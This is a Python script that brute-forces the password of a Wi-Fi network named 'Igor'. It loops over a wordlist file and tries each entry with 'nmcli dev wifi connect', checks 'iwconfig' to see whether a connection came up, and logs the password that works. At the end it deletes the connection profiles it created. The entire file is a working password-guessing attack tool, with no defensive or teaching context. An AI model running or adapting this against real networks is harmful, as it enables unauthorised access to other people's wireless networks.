# -*- coding: utf-8 -*-
"""
Created on Sun Dec 15 21:28:22 2019

@author: nickel



"""

import os, threading, sys, time
from functools import reduce

os.chdir('/home/nickel/Документы/Simple_Scripts/Useful')

savingOut = sys.stdout
sys.stdout = open('LogOut.txt', 'w')

passwords = [ i.rstrip() for i in open('brutewords4.txt', 'r')]

name = 'Igor'

Done = False

trie = []

lock = threading.Lock()

def Brute(name, number):
    global trie, lock, Done
    with lock:
        os.popen('nmcli dev wifi connect {0} password {1}'.format(name, number))
        time.sleep(10)
        
        connection = os.popen('iwconfig', 'r')
        text = reduce((lambda x,y: str(x)+str(y)), connection.readlines() )
        ESSID = text.find('ESSID:')
        connected = (text[ESSID+6:ESSID+9])
        connection.close()
        
        trie.append(1)
        
        if connected != 'off':
            print( 'Done! At '+str(len(trie))+' try. \n\n\n\n!\n\n\n\nIts a "{0}"'.format(number))
            Done = True
            sys.exit()
        else:
            print('Password number', len(trie), 'was tried. No result...')
            sys.exit()
    
try:
    for number in passwords:
        if not Done:
            x = threading.Thread( target = Brute, args = (name, number))
            x.start()
            x.join()
        else:
            print('Brute-force attack well done. Exiting.')
            break
except Exception:
    pass    
finally:
    for each in range(1, len(trie)):
        x = os.popen("nmcli connection delete '{0} {1}'".format(name, each))
        x.close()
        print('connection', name, each, ' delete ')
    sys.stdout.write('Closing LogFile.')
    sys.stdout.flush()
    sys.stdout = savingOut




#%%
